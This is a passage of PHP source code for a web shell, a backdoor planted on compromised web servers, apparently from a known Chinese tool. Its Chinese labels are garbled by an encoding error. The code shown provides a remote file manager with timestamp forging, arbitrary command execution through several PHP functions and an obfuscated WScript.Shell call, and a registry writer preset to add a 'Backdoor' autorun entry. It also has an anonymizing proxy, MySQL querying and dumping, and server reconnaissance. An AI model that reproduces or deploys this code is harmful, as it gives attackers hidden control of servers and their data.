style=\\\"padding-left: 5px;\\\">[<a href=\\\"?dir=\".urlencode($dir).\"/\".urlencode($file).\"\\\"><font color=\\\"#006699\\\">$file</font></a>]</td>\\n\";\n\t\t\techo \"  <td align=\\\"center\\\" nowrap class=\\\"smlfont\\\">$ctime</td>\\n\";\n\t\t\techo \"  <td align=\\\"center\\\" nowrap class=\\\"smlfont\\\">$mtime</td>\\n\";\n\t\t\techo \"  <td align=\\\"center\\\" nowrap class=\\\"smlfont\\\">&lt;dir&gt;</td>\\n\";\n\t\t\techo \"  <td align=\\\"center\\\" nowrap class=\\\"smlfont\\\"><a href=\\\"?action=fileperm&dir=\".urlencode($dir).\"&file=\".urlencode($file).\"\\\">$dirperm</a></td>\\n\";\n\t\t\techo \"  <td align=\\\"center\\\" nowrap><a href=\\\"#\\\" onclick=\\\"really('\".urlencode($dir).\"','\".urlencode($file).\"','\ufffd\ufffd\u0237\ufffd\ufffd\u04aa\u027e\ufffd\ufffd $file \u013f\u00bc\ufffd\ufffd? \\\\n\\\\n\ufffd\ufffd\ufffd\ufffd\ufffd\u013f\u00bc\ufffd\u01ff\ufffd,\ufffd\u02f4\u03b2\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u027e\ufffd\ufffd\ufffd\ufffd\u013f\u00bc\ufffd\u00b5\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u013c\ufffd!','1')\\\">\u027e\ufffd\ufffd</a></td>\\n\";\n\t\t\techo \"</tr>\\n\";\n\t\t\t$dir_i++;\n\t\t} else {\n\t\t\tif($file==\"..\") {\n\t\t\t\techo \"<tr class=\".getrowbg().\">\\n\";\n\t\t\t\techo \"  <td nowrap colspan=\\\"6\\\" style=\\\"padding-left: 5px;\\\"><a href=\\\"?dir=\".urlencode($dir).\"/\".urlencode($file).\"\\\">\ufffd\ufffd\ufffd\ufffd\ufffd\u03fc\ufffd\u013f\u00bc</a></td>\\n\";\n\t\t\t\techo \"</tr>\\n\";\n\t\t\t}\n\t\t}\n\t}\n}// while\n@closedir($dirs); \n?>\n<tr bgcolor=\"#cccccc\">\n  <td colspan=\"6\" height=\"5\"></td>\n</tr>\n<FORM action=\"\" method=\"POST\">\n<?\n// \ufffd\u013c\ufffd\ufffd\u0431\ufffd\n$dirs=@opendir($dir);\n$file_i = '0';\nwhile ($file=@readdir($dirs)) {\n\t$filepath=\"$dir/$file\";\n\t$a=@is_dir($filepath);\n\tif($a==\"0\"){\t\t\n\t\t$size=@filesize($filepath);\n\t\t$size=$size/1024 ;\n\t\t$size= @number_format($size, 3);\n\t\tif (@filectime($filepath) == @filemtime($filepath)) {\n\t\t\t$ctime=@date(\"Y-m-d H:i:s\",@filectime($filepath));\n\t\t\t$mtime=@date(\"Y-m-d H:i:s\",@filemtime($filepath));\n\t\t} else {\n\t\t\t$ctime=\"<span class=\\\"redfont\\\">\".@date(\"Y-m-d H:i:s\",@filectime($filepath)).\"</span>\";\n\t\t\t$mtime=\"<span class=\\\"redfont\\\">\".@date(\"Y-m-d H:i:s\",@filemtime($filepath)).\"</span>\";\n\t\t}\n\t\t@$fileperm=substr(base_convert(@fileperms($filepath),10,8),-4);\n\t\techo \"<tr class=\".getrowbg().\">\\n\";\n\t\techo \"  <td style=\\\"padding-left: 5px;\\\">\";\n\t\techo \"<INPUT type=checkbox value=1 name=dl[$filepath]>\";\n\t\techo \"<a href=\\\"$filepath\\\" target=\\\"_blank\\\">$file</a></td>\\n\";\n\t\techo \"  <td align=\\\"center\\\" nowrap class=\\\"smlfont\\\">$ctime</td>\\n\";\n\t\techo \"  <td align=\\\"center\\\" nowrap class=\\\"smlfont\\\">$mtime</td>\\n\";\n\t\techo \"  <td align=\\\"right\\\" nowrap class=\\\"smlfont\\\"><span class=\\\"redfont\\\">$size</span> KB</td>\\n\";\n\t\techo \"  <td align=\\\"center\\\" nowrap class=\\\"smlfont\\\"><a href=\\\"?action=fileperm&dir=\".urlencode($dir).\"&file=\".urlencode($file).\"\\\">$fileperm</a></td>\\n\";\n\t\techo \"  <td align=\\\"center\\\" nowrap><a href=\\\"?downfile=\".urlencode($filepath).\"\\\">\ufffd\ufffd\ufffd\ufffd</a> | <a href=\\\"?action=editfile&dir=\".urlencode($dir).\"&editfile=\".urlencode($file).\"\\\">\ufffd\u0f2d</a> | <a href=\\\"#\\\" onclick=\\\"really('\".urlencode($dir).\"','\".urlencode($filepath).\"','\ufffd\ufffd\u0237\ufffd\ufffd\u04aa\u027e\ufffd\ufffd $file \ufffd\u013c\ufffd\ufffd\ufffd?','2')\\\">\u027e\ufffd\ufffd</a> | <a href=\\\"?action=rename&dir=\".urlencode($dir).\"&fname=\".urlencode($filepath).\"\\\">\ufffd\ufffd\ufffd\ufffd</a> | <a href=\\\"?action=newtime&dir=\".urlencode($dir).\"&file=\".urlencode($filepath).\"\\\">\u02b1\ufffd\ufffd</a></td>\\n\";\n\t\techo \"</tr>\\n\";\n\t\t$file_i++;\n\t}\n}// while\n@closedir($dirs); \n$tb->tdbody('<table width=\"100%\" border=\"0\" cellpadding=\"2\" cellspacing=\"0\" align=\"center\"><tr><td>'.$tb->makeinput('chkall','on','onclick=\"CheckAll(this.form)\"','checkbox','30','').' '.$tb->makeinput('downrar','\u0461\ufffd\ufffd\ufffd\u013c\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd','','submit').'</td><td align=\"right\">'.$dir_i.' \ufffd\ufffd\u013f\u00bc / '.$file_i.' \ufffd\ufffd\ufffd\u013c\ufffd</td></tr></table>','center',getrowbg(),'','','6');\n\necho \"</FORM>\\n\";\necho \"</table>\\n\";\n}// end dir\n\nelseif ($_GET['action'] == \"editfile\") {\n\tif(empty($newfile)) {\n\t\t$filename=\"$dir/$editfile\";\n\t\t$fp=@fopen($filename,\"r\");\n\t\t$contents=@fread($fp, filesize($filename));\n\t\t@fclose($fp);\n\t\t$contents=htmlspecialchars($contents);\n\t}else{\n\t\t$editfile=$newfile;\n\t\t$filename = \"$dir/$editfile\";\n\t}\n\t$action = \"?dir=\".urlencode($dir).\"&editfile=\".$editfile;\n\t$tb->tableheader();\n\t$tb->formheader($action,'\ufffd\u00bd\ufffd/\ufffd\u0f2d\ufffd\u013c\ufffd');\n\t$tb->tdbody('\ufffd\ufffd\u01f0\ufffd\u013c\ufffd: '.$tb->makeinput('editfilename',$filename).' \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u013c\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u013c\ufffd');\n\t$tb->tdbody($tb->maketextarea('filecontent',$contents));\n\t$tb->makehidden('do','doeditfile');\n\t$tb->formfooter('1','30');\n}//end editfile\n\nelseif ($_GET['action'] == \"rename\") {\n\t$nowfile = (isset($_POST['newname'])) ? $_POST['newname'] : basename($_GET['fname']);\n\t$action = \"?dir=\".urlencode($dir).\"&fname=\".urlencode($fname);\n\t$tb->tableheader();\n\t$tb->formheader($action,'\ufffd\u07b8\ufffd\ufffd\u013c\ufffd\ufffd\ufffd');\n\t$tb->makehidden('oldname',$dir.\"/\".$nowfile);\n\t$tb->makehidden('dir',$dir);\n\t$tb->tdbody('\ufffd\ufffd\u01f0\ufffd\u013c\ufffd\ufffd\ufffd: '.basename($nowfile));\n\t$tb->tdbody('\ufffd\ufffd\ufffd\ufffd\u03aa: '.$tb->makeinput('newname'));\n\t$tb->makehidden('do','rename');\n\t$tb->formfooter('1','30');\n}//end rename\n\nelseif ($_GET['action'] == \"fileperm\") {\n\t$action = \"?dir=\".urlencode($dir).\"&file=\".$file;\n\t$tb->tableheader();\n\t$tb->formheader($action,'\ufffd\u07b8\ufffd\ufffd\u013c\ufffd\ufffd\ufffd\ufffd\ufffd');\n\t$tb->tdbody('\ufffd\u07b8\ufffd '.$file.' \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u03aa: '.$tb->makeinput('fileperm',substr(base_convert(fileperms($dir.'/'.$file),10,8),-4)));\n\t$tb->makehidden('file',$file);\n\t$tb->makehidden('dir',urlencode($dir));\n\t$tb->makehidden('do','editfileperm');\n\t$tb->formfooter('1','30');\n}//end fileperm\n\nelseif ($_GET['action'] == \"newtime\") {\n\t$action = \"?dir=\".urlencode($dir);\n\t$cachemonth = array('January'=>1,'February'=>2,'March'=>3,'April'=>4,'May'=>5,'June'=>6,'July'=>7,'August'=>8,'September'=>9,'October'=>10,'November'=>11,'December'=>12);\n\t$tb->tableheader();\n\t$tb->formheader($action,'\ufffd\ufffd\u00a1\ufffd\u013c\ufffd\ufffd\ufffd\ufffd\ufffd\u07b8\ufffd\u02b1\ufffd\ufffd');\n\t$tb->tdbody(\"\ufffd\u07b8\ufffd\ufffd\u013c\ufffd: \".$tb->makeinput('curfile',$file,'readonly').\" \ufffd\ufffd \u013f\ufffd\ufffd\ufffd\u013c\ufffd: \".$tb->makeinput('tarfile','\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u00b7\ufffd\ufffd\ufffd\ufffd\ufffd\u013c\ufffd\ufffd\ufffd'),'center','2','30');\n\t$tb->makehidden('do','domodtime');\n\t$tb->formfooter('','30');\n\t$tb->formheader($action,'\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\u013c\ufffd\ufffd\ufffd\ufffd\ufffd\u07b8\ufffd\u02b1\ufffd\ufffd');\n\t$tb->tdbody('<br><ul><li>\ufffd\ufffd\u0427\ufffd\ufffd\u02b1\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0377\ufffd\u03a7\ufffd\u01f4\u04f8\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02b1\ufffd\ufffd 1901 \ufffd\ufffd 12 \ufffd\ufffd 13 \ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd 20:45:54 \ufffd\ufffd 2038\ufffd\ufffd 1 \ufffd\ufffd 19 \ufffd\ufffd \ufffd\ufffd\ufffd\u06b6\ufffd 03:14:07<br>(\ufffd\ufffd\ufffd\ufffd\ufffd\u06b8\ufffd\ufffd\ufffd 32 \u03bb\ufffd\u0437\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0421\u05b5\ufffd\ufffd\ufffd\ufffd\ufffd\u05b5\ufffd\ufffd\ufffd\ufffd)</li><li>\u02f5\ufffd\ufffd: \ufffd\ufffd\u0221 01 \ufffd\ufffd 30 \u05ae\ufffd\ufffd, \u02b1\u0221 0 \ufffd\ufffd 24 \u05ae\ufffd\ufffd, \ufffd\u05ba\ufffd\ufffd\ufffd\u0221 0 \ufffd\ufffd 60 \u05ae\ufffd\ufffd!</li></ul>','left');\n\t$tb->tdbody('\ufffd\ufffd\u01f0\ufffd\u013c\ufffd\ufffd\ufffd: '.$file);\n\t$tb->makehidden('curfile',$file);\n\t$tb->tdbody('\ufffd\u07b8\ufffd\u03aa: '.$tb->makeinput('year','1984','','text','4').' \ufffd\ufffd '.$tb->makeselect(array('name'=>'month','option'=>$cachemonth,'selected'=>'October')).' \ufffd\ufffd '.$tb->makeinput('data','18','','text','2').' \ufffd\ufffd '.$tb->makeinput('hour','20','','text','2').' \u02b1 '.$tb->makeinput('minute','00','','text','2').' \ufffd\ufffd '.$tb->makeinput('second','00','','text','2').' \ufffd\ufffd','center','2','30');\n\t$tb->makehidden('do','modmytime');\n\t$tb->formfooter('1','30');\n}//end newtime\n\nelseif ($_GET['action'] == \"shell\") {\n\t$action = \"??action=shell&dir=\".urlencode($dir);\n\t$tb->tableheader();\n\t$tb->tdheader('WebShell Mode');\n\n\tif (substr(PHP_OS, 0, 3) == 'WIN') {\n\t\t$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32\\cmd.exe\";\n\t\t$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname.\"/log.txt\";\n\t\techo \"<form action=\\\"?action=shell&dir=\".urlencode($dir).\"\\\" method=\\\"POST\\\">\\n\";\n\t\t$tb->tdbody('\ufffd\u07bb\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0433\ufffd\ufffd\ufffd \ufffd\ufffd \ufffd\u013c\ufffd: '.$tb->makeinput('program',$program).' \ufffd\ufffd\ufffd\ufffd: '.$tb->makeinput('prog',$prog,'','text','40').' '.$tb->makeinput('','Run','','submit'),'center','2','35');\n\t\t$tb->makehidden('do','programrun');\n\t\techo \"</form>\\n\";\n\t}\n\n\techo \"<form action=\\\"?action=shell&dir=\".urlencode($dir).\"\\\" method=\\\"POST\\\">\\n\";\n\t$tb->tdbody('\ufffd\ufffd\u02be:\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u022b,\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0434\ufffd\ufffd\ufffd\u013c\ufffd.\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0535\u00f5\ufffd\u022b\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd.');\n\t\n\t$execfuncs = (substr(PHP_OS, 0, 3) == 'WIN') ? array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen','wscript'=>'Wscript.Shell') : array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen');\n\n\t$tb->tdbody('\u0461\ufffd\ufffd\u05b4\ufffd\u043a\ufffd\ufffd\ufffd: '.$tb->makeselect(array('name'=>'execfunc','option'=>$execfuncs,'selected'=>$execfunc)).' \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd: '.$tb->makeinput('command',$_POST['command'],'','text','60').' '.$tb->makeinput('','Run','','submit'));\n?>\n  <tr class=\"secondalt\">\n    <td align=\"center\"><textarea name=\"textarea\" cols=\"100\" rows=\"25\" readonly><?php\n\tif (!empty($_POST['command'])) {\n\t\tif ($execfunc==\"system\") {\n\t\t\tsystem($_POST['command']);\n\t\t} elseif ($execfunc==\"passthru\") {\n\t\t\tpassthru($_POST['command']);\n\t\t} elseif ($execfunc==\"exec\") {\n\t\t\t$result = exec($_POST['command']);\n\t\t\techo $result;\n\t\t} elseif ($execfunc==\"shell_exec\") {\n\t\t\t$result=shell_exec($_POST['command']);\n\t\t\techo $result;\t\n\t\t} elseif ($execfunc==\"popen\") {\n\t\t\t$pp = popen($_POST['command'], 'r');\n\t\t\t$read = fread($pp, 2096);\n\t\t\techo $read;\n\t\t\tpclose($pp);\n\t\t} elseif ($execfunc==\"wscript\") {\n\t\t\t$wsh = new COM('W'.'Scr'.'ip'.'t.she'.'ll') or die(\"PHP Create COM WSHSHELL failed\");\n\t\t\t$exec = $wsh->exec (\"cm\".\"d.e\".\"xe /c \".$_POST['command'].\"\");\n\t\t\t$stdout = $exec->StdOut();\n\t\t\t$stroutput = $stdout->ReadAll();\n\t\t\techo $stroutput;\n\t\t} else {\n\t\t\tsystem($_POST['command']);\n\t\t}\n\t}\n\t?></textarea></td>\n  </tr>  \n  </form>\n</table>\n<?php\n}//end shell\n\nelseif ($_GET['action'] == \"reg\") {\n\t$action = '?action=reg';\n\t$regname = isset($_POST['regname']) ? $_POST['regname'] : 'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp\\PortNumber';\n\t$registre = isset($_POST['registre']) ? $_POST['registre'] : 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor';\n\t$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\\winnt\\backdoor.exe';\n\t$delregname = $_POST['delregname'];\n\t$tb->tableheader();\n\t$tb->formheader($action,'\ufffd\ufffd\u0221\u05e2\ufffd\ufffd\ufffd');\n\t$tb->tdbody('\ufffd\ufffd\u05b5: '.$tb->makeinput('readregname',$regname,'','text','100').' '.$tb->makeinput('regread','\ufffd\ufffd\u0221','','submit'),'center','2','50');\n\techo \"</form>\";\n\n\t$tb->formheader($action,'\u0434\ufffd\ufffd\u05e2\ufffd\ufffd\ufffd');\n\t$cacheregtype = array('REG_SZ'=>'REG_SZ','REG_BINARY'=>'REG_BINARY','REG_DWORD'=>'REG_DWORD','REG_MULTI_SZ'=>'REG_MULTI_SZ','REG_EXPAND_SZ'=>'REG_EXPAND_SZ');\n\t$tb->tdbody('\ufffd\ufffd\u05b5: '.$tb->makeinput('writeregname',$registre,'','text','56').' \ufffd\ufffd\ufffd\ufffd: '.$tb->makeselect(array('name'=>'regtype','option'=>$cacheregtype,'selected'=>$regtype)).' \u05b5:  '.$tb->makeinput('regval',$regval,'','text','15').' '.$tb->makeinput('regwrite','\u0434\ufffd\ufffd','','submit'),'center','2','50');\n\techo \"</form>\";\n\n\t$tb->formheader($action,'\u027e\ufffd\ufffd\u05e2\ufffd\ufffd\ufffd');\n\t$tb->tdbody('\ufffd\ufffd\u05b5: '.$tb->makeinput('delregname',$delregname,'','text','100').' '.$tb->makeinput('regdelete','\u027e\ufffd\ufffd','','submit'),'center','2','50');\n\techo \"</form>\";\n\t$tb->tablefooter();\n}//end reg\n\nelseif ($_GET['action'] == \"proxy\") {\n\t$action = '?action=proxy';\n\t$tb->tableheader();\n\t$tb->formheader($action,'\ufffd\ufffd\ufffd\u07f4\ufffd\ufffd\ufffd','proxyframe');\n\t$tb->tdbody('<br><ul><li>\ufffd\u00f1\ufffd\ufffd\ufffd\ufffd\u073d\ufffd\u02b5\ufffd\u05bc\uda96\udd75\ufffd HTTP \ufffd\ufffd\ufffd\ufffd,\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02be\u02b9\ufffd\ufffd\ufffd\ufffd\ufffd\u00b7\ufffd\ufffd\ufffd\ufffd\u037c\u01ac\ufffd\ufffd\ufffd\ufffd\ufffd\u04fc\ufffdCSS\ufffd\ufffd\u02bd\ufffd\ufffd.</li><li>\ufffd\u00f1\ufffd\ufffd\ufffd\ufffd\u073f\ufffd\ufffd\ufffd\u0368\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u013f\ufffd\ufffdURL,\ufffd\ufffd\ufffd\ufffd\u05a7\ufffd\ufffd SQL Injection \u033d\ufffd\ufffd\ufffd\u053c\ufffd\u0133\u0429\ufffd\ufffd\ufffd\ufffd\ufffd\u05b7\ufffd.</li><li>\ufffd\u00f1\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd URL,\ufffd\ufffd\u013f\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u00b5\ufffdIP\ufffd\ufffd\u00bc\ufffd\ufffd : '.$_SERVER['REMOTE_ADDR'].'</li></ul>','left');\n\t$tb->tdbody('URL: '.$tb->makeinput('url','http://www.4ngel.net','','text','100').' '.$tb->makeinput('','\ufffd\ufffd\ufffd','','submit'),'center','1','40');\n\t$tb->tdbody('<iframe name=\"proxyframe\" frameborder=\"0\" width=\"765\" height=\"400\" marginheight=\"0\" marginwidth=\"0\" scrolling=\"auto\" src=\"http://www.4ngel.net\"></iframe>');\n\techo \"</form>\";\n\t$tb->tablefooter();\n}//end proxy\n\nelseif ($_GET['action'] == \"sql\") {\n\t$action = '?action=sql';\n\t$servername = isset($_POST['servername']) ? $_POST['servername'] : 'localhost';\n\t$dbusername = isset($_POST['dbusername']) ? $_POST['dbusername'] : 'root';\n\t$dbpassword = $_POST['dbpassword'];\n\t$dbname = $_POST['dbname'];\n\t$sql_query = $_POST['sql_query'];\n\t$tb->tableheader();\n\t$tb->formheader($action,'\u05b4\ufffd\ufffd SQL \ufffd\ufffd\ufffd');\n\t$tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'','text','15').' Pass: '.$tb->makeinput('dbpassword',$dbpassword,'','text','15').' DB: '.$tb->makeinput('dbname',$dbname,'','text','15').' '.$tb->makeinput('connect','\ufffd\ufffd\ufffd\ufffd','','submit'));\n\t$tb->tdbody($tb->maketextarea('sql_query',$sql_query,'85','10'));\n\t$tb->makehidden('do','query');\n\t$tb->formfooter('1','30');\n}//end sql query\n\nelseif ($_GET['action'] == \"sqlbak\") {\n\t$action = '?action=sqlbak';\n\t$servername = isset($_POST['servername']) ? $_POST['servername'] : 'localhost';\n\t$dbusername = isset($_POST['dbusername']) ? $_POST['dbusername'] : 'root';\n\t$dbpassword = $_POST['dbpassword'];\n\t$dbname = $_POST['dbname'];\n\t$tb->tableheader();\n\t$tb->formheader($action,'\ufffd\ufffd\ufffd\ufffd MySQL \ufffd\ufffd\ufffd\u077f\ufffd');\n\t$tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'','text','15').' Pass: '.$tb->makeinput('dbpassword',$dbpassword,'','text','15').' DB: '.$tb->makeinput('dbname',$dbname,'','text','15').' '.$tb->makeinput('connect','\ufffd\ufffd\ufffd\ufffd','','submit'));\n\t@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname);\n    $tables = @mysql_list_tables($dbname);\n    while ($table = @mysql_fetch_row($tables)) {\n\t\t$cachetables[$table[0]] = $table[0];\n    }\n    @mysql_free_result($tables);\n\tif (empty($cachetables)) {\n\t\t$tb->tdbody('<b>\ufffd\ufffd\u00fb\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u077f\ufffd or \ufffd\ufffd\u01f0\ufffd\ufffd\ufffd\u077f\ufffd\u00fb\ufffd\ufffd\ufffd\u03ba\ufffd\ufffd\ufffd\ufffd\u0771\ufffd</b>');\n\t} else {\n\t\t$tb->tdbody('<table border=\"0\" cellpadding=\"3\" cellspacing=\"1\"><tr><td valign=\"top\">\ufffd\ufffd\u0461\ufffd\ufffd\ufffd:</td><td>'.$tb->makeselect(array('name'=>'table[]','option'=>$cachetables,'multiple'=>1,'size'=>15,'css'=>1)).'</td></tr><tr nowrap><td><input type=\"radio\" name=\"backuptype\" value=\"server\" checked> \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u00b7\ufffd\ufffd:</td><td>'.$tb->makeinput('path',$pathname.'/'.$_SERVER['HTTP_HOST'].'_MySQL.sql','','text','50').'</td></tr><tr nowrap><td colspan=\"2\"><input type=\"radio\" name=\"backuptype\" value=\"download\"> \u05b1\ufffd\ufffd\ufffd\ufffd\ufffd\u0635\ufffd\ufffd\ufffd\ufffd\ufffd (\ufffd\u02ba\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0421\ufffd\ufffd\ufffd\ufffd\ufffd\u077f\ufffd)</td></tr></table>');\n\t\t$tb->makehidden('do','backupmysql');\n\t\t$tb->formfooter('0','30');\n\t}\n\t$tb->tablefooter();\n\t@mysql_close();\n}//end sql backup\n\nelseif ($_GET['action'] == \"phpenv\") {\n\t$upsize=get_cfg_var(\"file_uploads\") ? get_cfg_var(\"upload_max_filesize\") : \"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u03f4\ufffd\";\n\t$adminmail=(isset($_SERVER['SERVER_ADMIN'])) ? \"<a href=\\\"mailto:\".$_SERVER['SERVER_ADMIN'].\"\\\">\".$_SERVER['SERVER_ADMIN'].\"</a>\" : \"<a href=\\\"mailto:\".get_cfg_var(\"sendmail_from\").\"\\\">\".get_cfg_var(\"sendmail_from\").\"</a>\";\n\tif ($dis_func == \"\") {\n\t\t$dis_func = \"No\";\n\t}else {\n\t\t$dis_func = str_replace(\" \",\"<br>\",$dis_func);\n\t\t$dis_func = str_replace(\",\",\"<br>\",$dis_func);\n\t}\n\t$phpinfo=(!eregi(\"phpinfo\",$dis_func)) ? \"Yes\" : \"No\";\n\t\t$info = array(\n\t\t\t0  => array(\"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02b1\ufffd\ufffd\",date(\"Y\ufffd\ufffdm\ufffd\ufffdd\ufffd\ufffd h:i:s\",time())),\n\t\t\t1  => array(\"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\",\"<a href=\\\"http://\".$_SERVER['SERVER_NAME'].\"\\\" target=\\\"_blank\\\">\".$_SERVER['SERVER_NAME'].\"</a>\"),\n\t\t\t2  => array(\"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdIP\ufffd\ufffd\u05b7\",gethostbyname($_SERVER['SERVER_NAME'])),\n\t\t\t3  => array(\"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u03f5\u0373\",PHP_OS),\n\t\t\t5  => array(\"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u03f5\u0373\ufffd\ufffd\ufffd\u05b1\ufffd\ufffd\ufffd\",$_SERVER['HTTP_ACCEPT_LANGUAGE']),\n\t\t\t6  => array(\"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\",$_SERVER['SERVER_SOFTWARE']),\n\t\t\t7  => array(\"Web\ufffd\ufffd\ufffd\ufffd\u02ff\ufffd\",$_SERVER['SERVER_PORT']),\n\t\t\t8  => array(\"PHP\ufffd\ufffd\ufffd\u0437\ufffd\u02bd\",strtoupper(php_sapi_name())),\n\t\t\t9  => array(\"PHP\ufffd\u6c7e\",PHP_VERSION),\n\t\t\t10 => array(\"\ufffd\ufffd\ufffd\ufffd\ufffd\u06b0\ufffd\u022b\u0123\u02bd\",getphpcfg(\"safemode\")),\n\t\t\t11 => array(\"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0531\",$adminmail),\n\t\t\t12 => array(\"\ufffd\ufffd\ufffd\u013c\ufffd\u00b7\ufffd\ufffd\",__FILE__),\n\n\t\t\t13 => array(\"\ufffd\ufffd\ufffd\ufffd\u02b9\ufffd\ufffd URL \ufffd\ufffd\ufffd\u013c\ufffd allow_url_fopen\",getphpcfg(\"allow_url_fopen\")),\n\t\t\t14 => array(\"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u032c\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u04ff\ufffd enable_dl\",getphpcfg(\"enable_dl\")),\n\t\t\t15 => array(\"\ufffd\ufffd\u02be\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u03e2 display_errors\",getphpcfg(\"display_errors\")),\n\t\t\t16 => array(\"\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\u022b\ufffd\u05b1\ufffd\ufffd\ufffd register_globals\",getphpcfg(\"register_globals\")),\n\t\t\t17 => array(\"magic_quotes_gpc\",getphpcfg(\"magic_quotes_gpc\")),\n\t\t\t18 => array(\"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02b9\ufffd\ufffd\ufffd\u06b4\ufffd\ufffd\ufffd memory_limit\",getphpcfg(\"memory_limit\")),\n\t\t\t19 => array(\"POST\ufffd\ufffd\ufffd\ufffd\u05bd\ufffd\ufffd\ufffd post_max_size\",getphpcfg(\"post_max_size\")),\n\t\t\t20 => array(\"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u03f4\ufffd\ufffd\u013c\ufffd upload_max_filesize\",$upsize),\n\t\t\t21 => array(\"\ufffd\ufffd\ufffd\ufffd\ufffd\uece4\ufffd\ufffd\ufffd\ufffd\u02b1\ufffd\ufffd max_execution_time\",getphpcfg(\"max_execution_time\").\"\ufffd\ufffd\"),\n\t\t\t22 => array(\"\ufffd\ufffd\ufffd\ufffd\ufffd\u00f5\u013a\ufffd\ufffd\ufffd disable_functions\",$dis_func),\n\t\t\t23 => array(\"phpinfo()\",$phpinfo),\n\t\t\t24 => array(\"\u013f\u01f0\ufffd\ufffd\ufffd\u043f\ufffd\ufffd\ufffd\u057c\ufffddiskfreespace\",intval(diskfreespace(\".\") / (1024 * 1024)).'Mb'),\n\n\t\t\t25 => array(\"\u037c\ufffd\u03b4\ufffd\ufffd\ufffd GD Library\",getfun(\"imageline\")),\n\t\t\t26 => array(\"IMAP\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffd\u03f5\u0373\",getfun(\"imap_close\")),\n\t\t\t27 => array(\"MySQL\ufffd\ufffd\ufffd\u077f\ufffd\",getfun(\"mysql_close\")),\n\t\t\t28 => array(\"SyBase\ufffd\ufffd\ufffd\u077f\ufffd\",getfun(\"sybase_close\")),\n\t\t\t29 => array(\"Oracle\ufffd\ufffd\ufffd\u077f\ufffd\",getfun(\"ora_close\")),\n\t\t\t30 => array(\"Oracle 8 \ufffd\ufffd\ufffd\u077f\ufffd\",getfun(\"OCILogOff\")),\n\t\t\t31 => array(\"PREL\ufffd\ufffd\ufffd\ufffd\ufffd\ufde8 PCRE\",getfun(\"preg_match\")),\n\t\t\t32 => array(\"PDF\ufffd\u0135\ufffd\u05a7\ufffd\ufffd\",getfun(\"pdf_close\")),\n\t\t\t33 => array(\"Postgre SQL\ufffd\ufffd\ufffd\u077f\ufffd\",getfun(\"pg_close\")),\n\t\t\t34 => array(\"SNMP\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u042d\ufffd\ufffd\",getfun(\"snmpget\")),\n\t\t\t35 => 